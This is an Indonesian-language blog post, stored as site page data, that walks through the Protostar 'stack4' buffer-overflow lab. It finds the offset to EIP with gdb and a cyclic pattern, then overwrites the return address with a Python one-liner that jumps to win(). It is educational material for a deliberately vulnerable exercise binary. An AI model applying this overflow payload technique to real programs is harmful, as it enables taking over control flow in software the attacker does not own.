{"componentChunkName":"component---src-templates-blog-post-js","path":"/belajar-reversing-protostar-stack4/","result":{"data":{"markdownRemark":{"html":"<p>stack4 dapat ditemukan pada directory <code class=\"language-text\">/opt/protostar/bin/</code> bersama dengan challenge lainnya. Sebelum mengerjakan challenge ini baca terlebih dahulu deskripsi dan hints nya <a href=\"https://exploit-exercises.lains.space/protostar/stack4/\">disini</a>. Pada halaman tersebut diberitahukan jika challenge kali ini kita akan \"benar - benar\" menimpa <strong>EIP</strong>. <a href=\"http://www.c-jump.com/CIS77/ASM/Instructions/I77_0040_instruction_pointer.htm\">EIP</a> sendiri merupakan bagian register yang selalu berisikan alamat dari instruksi yang akan dieksekusi selanjutnya. Pengertian dan pembahasan lebih lanjut dari EIP dapat dibaca di <a href=\"wikipedia.org\">wikipedia</a> laman <a href=\"https://en.wikipedia.org/wiki/Program_counter\">Program Counter</a>.</p>\n<p>Pembeda utama dari challenge ini dengan <a href=\"/belajar-reversing-protostar-stack3/\">sebelumnya</a> ialah kali ini input untuk overflow kita yang sebelumnya terdiri dari <strong>ukuran buffer</strong> + <strong>alamat fungsi</strong> menjadi <strong>ukuran buffer</strong> + <strong>padding</strong> + <strong>alamat fungsi</strong> dengan padding merupakan jarak antara buffer dengan EIP. Mari kita cek dulu berkas stack4 dengan <code class=\"language-text\">file</code> seperti biasa.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">file</span> stack4</code></pre></div>\n<p>output:\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 647px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/661ae265c21f4373f84374204895ad37/ca12d/protostar-stack4-1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.500000000000002%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"output dari file\"\n        title=\"output dari file\"\n        src=\"/static/661ae265c21f4373f84374204895ad37/ca12d/protostar-stack4-1.png\"\n        srcset=\"/static/661ae265c21f4373f84374204895ad37/772e8/protostar-stack4-1.png 200w,\n/static/661ae265c21f4373f84374204895ad37/e17e5/protostar-stack4-1.png 400w,\n/static/661ae265c21f4373f84374204895ad37/ca12d/protostar-stack4-1.png 647w\"\n        sizes=\"(max-width: 647px) 100vw, 647px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Beruntung sekali stack4 ini tidak di strip, sehingga memudahkan bagi kita dalam menganalisis stack4. Sekarang mari kita tengok source codenya.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">win</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"code flow successfully changed\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Lebih singkat dari stack3 dan fungsi tujuan kita masih sama, <strong>win()</strong>. Dengan <strong>objdump</strong> mari kita cari alamat fungsi main.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">objdump -D stack4 <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> win</code></pre></div>\n<p>opsi -D berguna untuk mendisassembly stack4, selengkapnya dapat dibaca di manual dari objdump, <code class=\"language-text\">man objdump</code>. <strong>grep</strong> digunakan untuk memfilter output agar hanya menampilkan baris yang terdapat string 'win'.</p>\n<p>output:\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 649px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/c8204f8ca1e8fed14e1df8d1e69212f1/7762d/protostar-stack4-2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 8.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAcElEQVQI12OQtHP7L+3g/p/f3OG/sJXTfwEgLWjhCMYgvqi1y3+QGh4Tu/8CQDFRa+f/3EA2iBawcPjPomfxn0HL9D+DthkES9m7/5dz8gQbBFIkaAkxCGSgCNAwNkOb/wwaxhBNIKxpgsQ2RRgGpQEKSDtkVYk/FAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"output dari objdump\"\n        title=\"output dari objdump\"\n        src=\"/static/c8204f8ca1e8fed14e1df8d1e69212f1/7762d/protostar-stack4-2.png\"\n        srcset=\"/static/c8204f8ca1e8fed14e1df8d1e69212f1/772e8/protostar-stack4-2.png 200w,\n/static/c8204f8ca1e8fed14e1df8d1e69212f1/e17e5/protostar-stack4-2.png 400w,\n/static/c8204f8ca1e8fed14e1df8d1e69212f1/7762d/protostar-stack4-2.png 649w\"\n        sizes=\"(max-width: 649px) 100vw, 649px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Fungsi win terdapat pada alamat <em>080483f4</em>. Untuk mencari padding kita akan menggunakan <strong>gdb</strong>.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">gdb -q stack4\n<span class=\"token builtin class-name\">set</span> disassembly-flavor intel\ndisas main</code></pre></div>\n<p>Baris perintah pertama untuk meload stack4 ke gdb dengan mode quiet. Baris kedua digunakan untuk menginstruksikan gdb untuk menampilkan kode assembly dalam syntax intel. Baris selanjutnya digunakan untuk melihat daftar fungsi yang ada dan dipakai pada stack4. Baris terakhir ialah untuk mendisassembly fungsi main.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 650px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/89a2aca9eab0eaee2451439ce5d675ed/a6d36/protostar-stack4-3.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 90.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"meload stack4 kedalam gdb dan mendisassembly fungsi main\"\n        title=\"meload stack4 kedalam gdb dan mendisassembly fungsi main\"\n        src=\"/static/89a2aca9eab0eaee2451439ce5d675ed/a6d36/protostar-stack4-3.png\"\n        srcset=\"/static/89a2aca9eab0eaee2451439ce5d675ed/772e8/protostar-stack4-3.png 200w,\n/static/89a2aca9eab0eaee2451439ce5d675ed/e17e5/protostar-stack4-3.png 400w,\n/static/89a2aca9eab0eaee2451439ce5d675ed/a6d36/protostar-stack4-3.png 650w\"\n        sizes=\"(max-width: 650px) 100vw, 650px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Dengan gdb kita juga dapat mengetahui alamat dari fungsi main. Gunakan <code class=\"language-text\">info function</code> untuk menampilkan daftar fungsi. <code class=\"language-text\">disas win</code> untuk mendisassembly fungsi win dan mengetahui alamatnya (alamat pertama pada hasil disassembly fungsi win).</p>\n<div class=\"gatsby-highlight\" data-language=\"nasm\"><pre class=\"language-nasm\"><code class=\"language-nasm\">Dump of assembler code for function main:\n<span class=\"token number\">0x08048408</span> <span class=\"token operator\">&lt;</span>main<span class=\"token operator\">+</span><span class=\"token number\">0</span><span class=\"token operator\">></span>:    push   <span class=\"token register variable\">ebp</span>\n<span class=\"token number\">0x08048409</span> <span class=\"token operator\">&lt;</span>main<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">></span>:    mov    <span class=\"token register variable\">ebp</span>,<span class=\"token register variable\">esp</span>\n<span class=\"token number\">0x0804840b</span> <span class=\"token operator\">&lt;</span>main<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token operator\">></span>:    and    <span class=\"token register variable\">esp</span>,<span class=\"token number\">0xfffffff0</span>\n<span class=\"token number\">0x0804840e</span> <span class=\"token operator\">&lt;</span>main<span class=\"token operator\">+</span><span class=\"token number\">6</span><span class=\"token operator\">></span>:    sub    <span class=\"token register variable\">esp</span>,<span class=\"token number\">0x50</span>\n<span class=\"token number\">0x08048411</span> <span class=\"token operator\">&lt;</span>main<span class=\"token operator\">+</span><span class=\"token number\">9</span><span class=\"token operator\">></span>:    lea    <span class=\"token register variable\">eax</span>,<span class=\"token operator\">[</span><span class=\"token register variable\">esp</span><span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token operator\">]</span>\n<span class=\"token number\">0x08048415</span> <span class=\"token operator\">&lt;</span>main<span class=\"token operator\">+</span><span class=\"token number\">13</span><span class=\"token operator\">></span>:   mov    DWORD PTR <span class=\"token operator\">[</span><span class=\"token register variable\">esp</span><span class=\"token operator\">]</span>,<span class=\"token register variable\">eax</span>\n<span class=\"token number\">0x08048418</span> <span class=\"token operator\">&lt;</span>main<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token operator\">></span>:   call   <span class=\"token number\">0x804830c</span> <span class=\"token operator\">&lt;</span>gets@plt<span class=\"token operator\">></span>\n<span class=\"token number\">0x0804841d</span> <span class=\"token operator\">&lt;</span>main<span class=\"token operator\">+</span><span class=\"token number\">21</span><span class=\"token operator\">></span>:   leave\n<span class=\"token number\">0x0804841e</span> <span class=\"token operator\">&lt;</span>main<span class=\"token operator\">+</span><span class=\"token number\">22</span><span class=\"token operator\">></span>:   ret\nEnd of assembler dump.</code></pre></div>\n<p>Diatas merupakan hasil disassembly fungsi main. Yang kita lakukan selanjutnya ialah memasang <strong>breakpoint</strong>. Seperti namanya breakpoint merupakan poin berhenti, digunakan untuk mem\"pause\" program. Dalam hal ini kita akan memasang break/pause pada saat pemanggilan fungsi <strong>gets</strong>. Cara memasangnya ialah dengan menggunakan perintah berikut.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">break</span> <span class=\"token operator\">*</span><span class=\"token number\">0x08048418</span></code></pre></div>\n<p>break diikuti dengan asterisk (*) dan alamat dimana kita akan memasang break, saat pemanggilan fungsi gets.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 644px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/0ffbae045990dba2635f08f4fd9888c6/78274/protostar-stack4-4.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 8.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAa0lEQVQI12OQc/L6L2Hr+l/Vw/+/vn/If0VXn//sBlb/OQyt/7MDMbex7X8uYxsgtv3PqmcJl2PRs/jPoGX6n0HbDBVzAhWy6VuCNQlaOIIxiA0yCIQFzB3+85ragWmQQZxGNmA+K1APNgMBy7U67Tw8VrgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"break *0x08048418\"\n        title=\"break *0x08048418\"\n        src=\"/static/0ffbae045990dba2635f08f4fd9888c6/78274/protostar-stack4-4.png\"\n        srcset=\"/static/0ffbae045990dba2635f08f4fd9888c6/772e8/protostar-stack4-4.png 200w,\n/static/0ffbae045990dba2635f08f4fd9888c6/e17e5/protostar-stack4-4.png 400w,\n/static/0ffbae045990dba2635f08f4fd9888c6/78274/protostar-stack4-4.png 644w\"\n        sizes=\"(max-width: 644px) 100vw, 644px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Gunakan <code class=\"language-text\">run</code> untuk menjalankan program, lalu <code class=\"language-text\">ni</code> untuk lanjut satu step. Program akan meminta input. Kita akan menggunakan input berpola, tujuannya untuk mempermudah kita dalam mengetahui ukuran padding. Kita akan menggunakan web <a href=\"https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html\">https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html</a> untuk men <em>generate</em> kan pattern input. Cukup 100 karakter saja, karena ukuran buffer juga cuma 64 seharusnya 100 sudah cukup.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 448px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/7db87c45ecab699d0853b7fac31aa887/33b38/protostar-stack4-5.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"generate pattern\"\n        title=\"generate pattern\"\n        src=\"/static/7db87c45ecab699d0853b7fac31aa887/33b38/protostar-stack4-5.png\"\n        srcset=\"/static/7db87c45ecab699d0853b7fac31aa887/772e8/protostar-stack4-5.png 200w,\n/static/7db87c45ecab699d0853b7fac31aa887/e17e5/protostar-stack4-5.png 400w,\n/static/7db87c45ecab699d0853b7fac31aa887/33b38/protostar-stack4-5.png 448w\"\n        sizes=\"(max-width: 448px) 100vw, 448px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Lalu gunakan hasil generatenya sebagai input.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 650px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/c3075fd67c95a91bdf138a30259cdc7e/a6d36/protostar-stack4-6.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"input pattern\"\n        title=\"input pattern\"\n        src=\"/static/c3075fd67c95a91bdf138a30259cdc7e/a6d36/protostar-stack4-6.png\"\n        srcset=\"/static/c3075fd67c95a91bdf138a30259cdc7e/772e8/protostar-stack4-6.png 200w,\n/static/c3075fd67c95a91bdf138a30259cdc7e/e17e5/protostar-stack4-6.png 400w,\n/static/c3075fd67c95a91bdf138a30259cdc7e/a6d36/protostar-stack4-6.png 650w\"\n        sizes=\"(max-width: 650px) 100vw, 650px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Selanjutnya kita akan melihat isi <strong>stack</strong>. Gunakan perintah <code class=\"language-text\">info frame</code> dan pada bagian bawah gdb akan menunjukan dimana <code class=\"language-text\">eip</code>. Gunakan <code class=\"language-text\">x/s</code> untuk mengintip isi eip dan menampilkannya dalam string.</p>\n<p>output:\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 644px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/64077efde4e00924e9bc8b83e6c7d2ad/78274/protostar-stack4-7.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"isi eip\"\n        title=\"isi eip\"\n        src=\"/static/64077efde4e00924e9bc8b83e6c7d2ad/78274/protostar-stack4-7.png\"\n        srcset=\"/static/64077efde4e00924e9bc8b83e6c7d2ad/772e8/protostar-stack4-7.png 200w,\n/static/64077efde4e00924e9bc8b83e6c7d2ad/e17e5/protostar-stack4-7.png 400w,\n/static/64077efde4e00924e9bc8b83e6c7d2ad/78274/protostar-stack4-7.png 644w\"\n        sizes=\"(max-width: 644px) 100vw, 644px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Sebelum lanjut akan saya jelaskan perintah - perintah yang telah kita masukkan. <strong>run</strong> digunakan untuk menjalankan program dalam mode <em>debug</em>, kita juga dapat menggunakan argumen, me redirect standard input output dsb. <strong>ni</strong> digunakan untuk berjalan satu instruksi, namun tidak masuk pada <strong>subroutine calls</strong>, maksudnya ialah kita tidak masuk pada fungsi yang dipanggil melainkan lanjut saja. Selain ni terdapat juga <strong>si</strong>, jika menggunakan si ini kita lanjut satu instruksi juga akan masuk kedalam <strong>subroutine calls</strong>. Misalnya pada saat pemanggilan fungsi gets, jika kita menggunakan ni kita hanya akan menjalankan gets namun tidak masuk pada fungsi gets, jika kita menggunakan si kita akan masuk. Semoga masuk akal. Selanjutnya kita menggunakan <strong>info frame</strong> digunakan untuk melihat stack \"saat itu\". <strong>x/s</strong> digunakan untuk examine dalam string, selain string juga dapat dalam decimal, hex dan juga dapat diatur jumlahnya. Semua penjelasan perintah diatas dapat dilihat dengan menggunakan <code class=\"language-text\">help</code> diikuti perintah yang ingin diketahui maksudnya.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 650px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/348d05f62b1f8073fb6e26aa6c08189d/a6d36/protostar-stack4-8.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 90.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"help gdb\"\n        title=\"help gdb\"\n        src=\"/static/348d05f62b1f8073fb6e26aa6c08189d/a6d36/protostar-stack4-8.png\"\n        srcset=\"/static/348d05f62b1f8073fb6e26aa6c08189d/772e8/protostar-stack4-8.png 200w,\n/static/348d05f62b1f8073fb6e26aa6c08189d/e17e5/protostar-stack4-8.png 400w,\n/static/348d05f62b1f8073fb6e26aa6c08189d/a6d36/protostar-stack4-8.png 650w\"\n        sizes=\"(max-width: 650px) 100vw, 650px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Kembali lagi ke isi eip, salin isi eip (<em>c5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad</em>) lalu masukkan ke web <a href=\"https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html\">https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html</a> untuk mengetahui ukuran buffer + padding.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 221px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/3ac292bab2a647144a434e3b28913302/cccdc/protostar-stack4-9.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.50000000000001%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"find overflow offset\"\n        title=\"find overflow offset\"\n        src=\"/static/3ac292bab2a647144a434e3b28913302/cccdc/protostar-stack4-9.png\"\n        srcset=\"/static/3ac292bab2a647144a434e3b28913302/772e8/protostar-stack4-9.png 200w,\n/static/3ac292bab2a647144a434e3b28913302/cccdc/protostar-stack4-9.png 221w\"\n        sizes=\"(max-width: 221px) 100vw, 221px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>76 adalah ukuran buffer + padding. Selanjutnya kita akan keluar dari gdb lalu menjalankan stack4 dengan input random sebanyak 76 karakter diikuti alamat fungsi win. Untuk memasukkannya kita akan menggunakan bantuan python. Sekali lagi jangan lupakan bahwa protostar ialah little endian.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">q <span class=\"token comment\">#untuk keluar gdb</span>\ny <span class=\"token comment\">#untuk keluar gdb</span>\npython -c <span class=\"token string\">'print(\"A\"*76 + \"<span class=\"token entity\" title=\"\\xf4\">\\xf4</span><span class=\"token entity\" title=\"\\x83\">\\x83</span><span class=\"token entity\" title=\"\\x04\">\\x04</span><span class=\"token entity\" title=\"\\x08\">\\x08</span>\")'</span> <span class=\"token operator\">|</span> ./stack4</code></pre></div>\n<p>output:\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 651px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/081dd6d2497a95f2b8a8152374a91709/1ac66/protostar-stack4-10.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"code flow successfully changed\"\n        title=\"code flow successfully changed\"\n        src=\"/static/081dd6d2497a95f2b8a8152374a91709/1ac66/protostar-stack4-10.png\"\n        srcset=\"/static/081dd6d2497a95f2b8a8152374a91709/772e8/protostar-stack4-10.png 200w,\n/static/081dd6d2497a95f2b8a8152374a91709/e17e5/protostar-stack4-10.png 400w,\n/static/081dd6d2497a95f2b8a8152374a91709/1ac66/protostar-stack4-10.png 651w\"\n        sizes=\"(max-width: 651px) 100vw, 651px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Berhasil! Sekali lagi kita telah berhasil mengubah alur program.</p>","frontmatter":{"title":"Protostar: stack4"}}},"pageContext":{"slug":"/belajar-reversing-protostar-stack4/"}}}